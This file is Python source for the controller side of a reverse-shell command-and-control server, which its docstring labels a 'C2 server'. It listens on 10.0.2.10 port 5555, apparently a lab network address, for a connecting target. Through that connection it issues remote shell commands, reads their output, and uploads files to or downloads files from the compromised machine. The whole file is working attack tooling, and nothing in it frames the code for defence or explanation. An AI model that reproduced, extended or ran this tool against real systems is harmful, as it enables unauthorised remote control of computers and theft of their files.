import socket
import json
import os
import random
import time

def reliable_send(data):
    """Send data reliably using JSON serialization"""
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv():
    """Receive data reliably, handling partial JSON chunks"""
    data = ' '
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue  # Incomplete JSON, continue receiving

def upload_file(file_name):
    """Upload a file to the target machine"""
    try:
        f = open(file_name, 'rb')
        target.send(f.read())
        f.close()
        print(f"[+] File '{file_name}' uploaded successfully to target")
    except FileNotFoundError:
        print(f"[-] File '{file_name}' not found!")
        reliable_send("[-] File not found!")
    except Exception as e:
        print(f"[-] Error uploading file: {str(e)}")
        reliable_send(f"[-] Error: {str(e)}")

def download_file(file_name):
    """Download a file from the target machine"""
    try:
        f = open(file_name, 'wb')
        target.settimeout(1)  # 1 second timeout to detect end of file
        chunk = target.recv(1024)
        while chunk:
            f.write(chunk)
            try:
                chunk = target.recv(1024)
            except socket.timeout as e:
                break  # No more data, file transfer complete
        target.settimeout(None)  # Reset timeout
        f.close()
        print(f"[+] File '{file_name}' downloaded successfully from target")
    except Exception as e:
        print(f"[-] Error downloading file: {str(e)}")
        reliable_send(f"[-] Error: {str(e)}")

def target_communication():
    """Main communication loop with the target"""
    while True:
        try:
            # Get command from user
            command = input('* Shell~%s: ' % str(ip))
            reliable_send(command)
            
            # Handle local commands
            if command == 'quit':
                print("[+] Quitting...")
                break
            
            elif command == 'clear':
                # Clear screen (cross-platform)
                os.system('clear' if os.name == 'posix' else 'cls')
            
            elif command[:3] == 'cd ':
                pass  # CD command is processed on client side
            
            elif command[:8] == 'download':
                download_file(command[9:])  # Download file from target
            
            elif command[:6] == 'upload':
                upload_file(command[7:])  # Upload file to target
            
            else:
                # Send command to target and get result
                result = reliable_recv()
                if result:
                    print(result)
                else:
                    print("[!] No output received")
                    
        except ConnectionResetError:
            print("[!] Connection lost! Waiting for reconnection...")
            break
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user")
            reliable_send('quit')
            break
        except Exception as e:
            print(f"[!] Error in communication: {str(e)}")
            break

def start_server():
    """Initialize and start the C2 server"""
    global target, ip
    
    # Create socket with port reuse option
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        # Bind and listen for connections
        sock.bind(('10.0.2.10', 5555))
        print('[+] Listening For Incoming Connections...')
        sock.listen(5)
        
        # Accept connection from target
        target, ip = sock.accept()
        print(f'[+] Target Connected From: {str(ip)}')
        
        # Start communication
        target_communication()
        
    except socket.error as e:
        print(f"[-] Socket error: {str(e)}")
    except KeyboardInterrupt:
        print("\n[!] Server stopped by user")
    finally:
        # Clean up connections
        try:
            target.close()
            sock.close()
            print("[+] Connection closed")
        except:
            pass

if __name__ == "__main__":
    start_server()